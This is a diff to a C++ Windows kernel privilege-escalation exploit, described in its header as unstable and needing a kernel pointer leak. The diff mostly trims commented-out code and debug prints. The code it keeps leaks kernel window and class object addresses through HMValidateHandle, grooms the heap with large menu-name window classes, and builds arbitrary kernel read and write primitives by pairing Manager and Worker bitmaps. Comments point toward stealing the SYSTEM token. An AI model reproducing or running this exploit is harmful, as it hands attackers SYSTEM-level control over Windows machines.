@@ -1,4 +1,22 @@
 
+/*
+ <---- 
+ 
+ 	it needs ntoskrnl base address or alternatively a kernel pointer leak.
+	Copy & usage of this software are allowed without any restrictions.
+	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+	SOFTWARE.
+	
+	NOTE: UnStable
+ ---->
+*/
+
+
 #include <Windows.h>
 #include <stdio.h>
 #include <cstdint>
@@ -145,103 +163,6 @@ GetPsInitialSystemProcess(
 	return (DWORD64)Psi;
 }
 
-/*
-ULONGLONG RegisterCls(
-	LPCTSTR name
-	)
-{
-	WNDCLASSEX wnd = { 0x0 };
-	wnd.cbSize = sizeof(wnd);
-	wnd.lpszClassName = name;
-	wnd.lpfnWndProc = MainWProc;
-	WCHAR* Buff = new WCHAR[0x8f0];
-	RtlSecureZeroMemory(Buff, 0x8f0);
-	RtlFillMemory(Buff, 0x8f0,0x41);
-	//printf("\tallocated WndCls size is: %p\n",  0x8f0);
-	wnd.lpszMenuName = Buff;
-	int Res = RegisterClassEx(&wnd);
-	if (!Res)
-	{
-		printf("error: %d\n", GetLastError());
-		exit(GetLastError());
-	}
-
-	HWND hWnd = CreateWindowEx(
-		0,
-		wnd.lpszClassName,
-		name,
-		0,
-		CW_USEDEFAULT,
-		CW_USEDEFAULT,
-		CW_USEDEFAULT,
-		CW_USEDEFAULT,
-		NULL, NULL, NULL, NULL);
-	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd, 1);
-	ULONGLONG pSelf = (ULONGLONG)tagWND->h.pti + 0x20;
-	//ULONGLONG pSelf = (ULONGLONG)tagWND->pSelf;
-	printf("\tpSelf: 0x%llx\n", pSelf);
-
-	
-	//printf("\tpSelf: 0x%llx\n", tagWND->pSelf);
-	ULONGLONG ulClientDelta = pSelf - (ULONGLONG)tagWND->h.pti;
-	printf("\tulClientDelta: 0x%llx\n", ulClientDelta);
-	int r;
-	scanf("%d", r);
-	ULONGLONG kTagCLS = (ULONGLONG)tagWND->pSelf + (ULONGLONG)0xa8;
-	//printf("\tkTagCLS: 0x%llx\n", kTagCLS);
-	ULONGLONG uTagCLS = kTagCLS - ulClientDelta;
-	//printf("\tuTagCLS: 0x%llx\n", uTagCLS);
-	ULONGLONG lpszMenuName = uTagCLS + (ULONGLONG)0x90;
-	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);
-
-
-	DestroyWindow(hWnd);
-	UnregisterClassW(name, NULL);
-
-	return lpszMenuName;
-}
-
-ULONGLONG 
-RegisterCls(
-	LPCWSTR classNumber
-	) 
-{
-		auto bRet = GetHMValidateHandle();
-		auto hInst = GetModuleHandle(NULL);
-		auto wndClass = WNDCLASSEX();
-		wndClass.cbSize = sizeof(WNDCLASSEX);
-		wndClass.lpfnWndProc = WNDPROC();
-		wndClass.cbWndExtra = 0;
-		wndClass.hInstance = hInst;
-		WCHAR* Buff = new WCHAR[0x8f0];
-		RtlSecureZeroMemory(Buff, 0x8f0);
-		RtlFillMemory(Buff, 0x8f0, 0x41);
-		wndClass.lpszMenuName = Buff;
-		wndClass.lpszClassName = classNumber;
-
-		auto hCls = RegisterClassExW(&wndClass);
-		auto hWnd = CreateWindowExW(0, classNumber, L"aaa", 0xcf0000, 0, 0, 300, 300, 0, 0, hInst, 0);
-
-		PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd, 1);
-
-		ULONGLONG pSelf = (ULONGLONG)tagWND->pSelf;
-		//printf("\tpSelf: 0x%llx\n", tagWND->pSelf);
-		ULONGLONG ulClientDelta = pSelf - (ULONGLONG)tagWND->h.pti;
-		//printf("\tulClientDelta: 0x%llx\n", ulClientDelta);
-		ULONGLONG kTagCLS = (ULONGLONG)tagWND->pSelf + (ULONGLONG)0xa8;
-		//printf("\tkTagCLS: 0x%llx\n", kTagCLS);
-		ULONGLONG uTagCLS = kTagCLS - ulClientDelta;
-		//printf("\tuTagCLS: 0x%llx\n", uTagCLS);
-		ULONGLONG lpszMenuName = uTagCLS + (ULONGLONG)0x90;
-		//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);
-
-		DestroyWindow(hWnd);
-		UnregisterClassW(classNumber, hInst);
-
-		return lpszMenuName;
-}*/
-
-
 ULONGLONG
 RegisterCls(
 	__in    LPCWSTR classNumber,
@@ -256,25 +177,6 @@ RegisterCls(
 	HINSTANCE hInst = GetModuleHandleA(NULL);
 	auto hCls = RegisterClassExW(&wnd);
 	hWnd = CreateWindowExW(0, classNumber, L"akayn", 0xcf0000, 0, 0, 300, 300, 0, 0, hInst, 0);
-	//
-	/*PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd, 1);
-	ULONGLONG pSelf = (ULONGLONG)tagWND->pSelf;
-	//ULONGLONG pSelf = (ULONGLONG)tagWND->pSelf;
-	//printf("\tpSelf: 0x%llx\n", pSelf);
-
-
-	//printf("\tpSelf: 0x%llx\n", tagWND->pSelf);
-	ULONGLONG ulClientDelta = pSelf - (ULONGLONG)tagWND->h.pti;
-	//printf("\tulClientDelta: 0x%llx\n", ulClientDelta);
-	//int r;
-	//scanf("%d", r);
-	ULONGLONG kTagCLS = (ULONGLONG)tagWND->pSelf + (ULONGLONG)0xa8;
-	//printf("\tkTagCLS: 0x%llx\n", kTagCLS);
-	ULONGLONG uTagCLS = kTagCLS - ulClientDelta;
-	//printf("\tuTagCLS: 0x%llx\n", uTagCLS);
-	ULONGLONG lpszMenuName = uTagCLS + (ULONGLONG)0x90;
-	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);*/
-
 
 	uintptr_t uWND = (uintptr_t)pHmValidateHandle(hWnd, 1);
 
@@ -291,16 +193,7 @@ RegisterCls(
 	ULONGLONG lpszMenuName = *reinterpret_cast<ULONGLONG *>(kTagCLS - ulClientDelta + 0x90);
 	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);
 
-	/*ULONGLONG kernelpSelf = ptrWnd + (ULONGLONG)0x20;
-	printf("\tpSelf: 0x%llx\n", kernelpSelf);
-	ULONGLONG ulClientDelta = kernelpSelf - (ULONGLONG)hWnd;
-	printf("\tDelta: 0x%llx\n", ulClientDelta);
-	ULONGLONG kernelTagCLS = ptrWnd + (ULONGLONG)0xa8;
-	printf("\tkTagCLS: 0x%llx\n", kernelTagCLS);
-	ULONGLONG userTagCLS = kernelTagCLS - ulClientDelta;
-	printf("\tuTagCLS: 0x%llx\n", userTagCLS);
-	ULONGLONG lpszMenuName = userTagCLS + (ULONGLONG)0x90;
-	printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);*/
+	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);*/
 	DestroyWindow(hWnd);
 	UnregisterClassW(classNumber, NULL);
 	//int k;
@@ -323,7 +216,7 @@ InitMgr(
 		8,
 		&Buff
 	);
-	printf("hMgr %p\n", &ManagerBitmap);
+	//printf("hMgr %p\n", &ManagerBitmap);
 }
 
 void
@@ -341,7 +234,7 @@ InitWorker(
 		8,
 		&Buff
 	);
-	printf("hWorker %p\n", &WorkerBitmap);
+	//printf("hWorker %p\n", &WorkerBitmap);
 }
 
 ULONGLONG 
@@ -356,8 +249,6 @@ AllocFreeObjects(
 	ULONGLONG plpszMenuName;
 	wchar_t buffer[256];
 	int classNumber = 0;
-	//for (int t = 0; t < 200000;t++) { 
-	//000
 	while (1){
 			wsprintfW(buffer, L"%d", classNumber);
 			WNDCLASSEX wnd = { 0x0 };
@@ -418,16 +309,12 @@ DWORD64 BitmapRead(
 		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
 	);
 	SetBitmapBits(Mgr, 0x8, *reinterpret_cast<LPVOID *>(addr));
-	//(void *)(&addr)
 
 	if (GetBitmapBits(Wrk, 0x8, bRet) == NULL) {
 		printf("err");
 		exit(GetLastError());
 	}
-
-	//VirtualFree(bRet, 0x8, MEM_RELEASE);
 	return *reinterpret_cast<DWORD64 *>(bRet);
-	//return *((DWORD64 *)bRet);
 }
 
 DWORD64 BitmapWrite(
@@ -521,12 +408,12 @@ main(
 	auto addr = AllocFreeObjects(1);
 	auto hManager_pvscan0_offset = addr + (ULONGLONG)0x50;
 
-	printf("Mgr pvscan0 offset: %p\n", hManager_pvscan0_offset);
+	//printf("Mgr pvscan0 offset: %p\n", hManager_pvscan0_offset);
 
 	auto saddr = AllocFreeObjects(2);
 	auto hWorker_pvscan0_offset = saddr + (ULONGLONG)0x50;
 
-	printf("Wrk pvscan0 offset: %p\n", hWorker_pvscan0_offset);
+	//printf("Wrk pvscan0 offset: %p\n", hWorker_pvscan0_offset);
 
 	//int jk;
 	//scanf("%d", &jk);
@@ -565,7 +452,6 @@ main(
 	//
 	//auto Systoken = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
 	//	_EP + (DWORD64)0x358));
-	//printf("Systoken: %p", _EP); //Systoken
 	//
 	//int i;
 	//scanf("%d",&i);
@@ -578,6 +464,6 @@ main(
 	system("pause");
 	//int y;
 	//scanf( "%d", &y );
-    return 0;
+    return NULL;
 }
 
